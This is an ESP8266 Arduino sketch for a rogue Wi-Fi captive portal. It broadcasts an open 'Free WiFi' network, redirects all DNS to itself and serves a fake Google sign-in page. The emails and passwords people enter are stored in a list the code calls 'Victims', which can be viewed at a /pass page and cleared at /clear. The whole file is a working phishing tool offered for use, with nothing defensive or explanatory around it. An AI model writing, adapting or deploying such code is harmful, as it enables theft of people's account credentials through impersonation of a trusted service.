#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// User configuration
#define SSID_NAME "Free WiFi"
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 60 seconds for device connection. Thank you."
#define PASS_TITLE "Victims"
#define CLEAR_TITLE "Cleared"

// System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(192, 168, 0, 1); // This is the captive portal IP address

String Victims = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "<br><footer><div><center><p>Copyright&#169; 2024-2025 | All rights reserved.</p></center></div></footer>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "body { background-color: #fff; font-family: 'Roboto', sans-serif; margin: 0; text-align: center; }"
               ".google { font-size: 3rem; margin-bottom: 20px; }"
               ".google span { font-weight: bold; color: #4285F4; }"
               ".signin { text-align: center; font-size: 1.4rem; color: #5F6368; margin-top: 10px; }"
               "form { width: 100%; max-width: 380px; margin: 0 auto; padding: 0 20px; }"
               "img { width: 30%; margin: 20px auto; display: block; }"
               ".input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }"
               ".btn { background-color: #1a73e8; color: #fff; border: none; border-radius: 5px; padding: 14px; font-size: 16px; cursor: pointer; width: 100%; }"
               ".btn:hover { background-color: #1558b0; }"
               ".block { font-size: 13px; color: #5F6368; margin-top: 10px; }"
               ".block a { text-decoration: none; color: #1a73e8; }"
               ".help { float: right; }";
  String h = "<!DOCTYPE html><html><head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head><body>";
  return h;
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + Victims + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header("Sign In") +
         "<p class='Free Wifi'>" +
         "<span>G</span>" +
         "<span>o</span>" +
         "<span>o</span>" +
         "<span>g</span>" +
         "<span>l</span>" +
         "<span>e</span>" +
         "</p>" +
         "<p class='signin'>Sign in to continue</p>" +
         "<form action='/post' method='post'>" +
         "<img src='https://upload.wikimedia.org/wikipedia/commons/4/4e/Google_2015_logo.svg' alt=''>" +
         "<input class='input' type='email' name='email' placeholder='Email or phone' autofocus required>" +
         "<input class='input' type='password' name='password' placeholder='Enter your password' required>" +
         "<button class='btn' type='submit'>Submit</button>" +
         "<div class='block'>" +
         "<div class='checkbox'><input type='checkbox' name='stay_signed_in'> Stay signed in</div>" +
         "<div class='help'><a href='#'>Need help?</a></div>" +
         "</div>" +
         "</form>" +
         "<p class='create'><a href='#'>Apply for Wifi Service</a></p>" +
         "<p class='every'>One Wifi Access Everywhere</p>" + footer();
}

String posted() {
  String email = input("email");
  String password = input("password");
  Victims = "<li>Email: <b>" + email + "</b><br>Password: <b style=color:#ea5455;>" + password + "</b></li>" + Victims;
  String response = String("<html><body>") + POST_BODY + footer() + "</body></html>";
  return response;
}

String clear() {
  Victims = "<p></p>";
  String response = String("<html><body>") + CLEAR_TITLE + "<div><p>The Victims list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer() + "</body></html>";
  return response;
}

void BLINK() {
  int count = 1;
  while (count <= 5) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); 
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/pass", []() {
    webServer.send(HTTP_CODE, "text/html", pass());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });

  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest(); 
  webServer.handleClient();
}
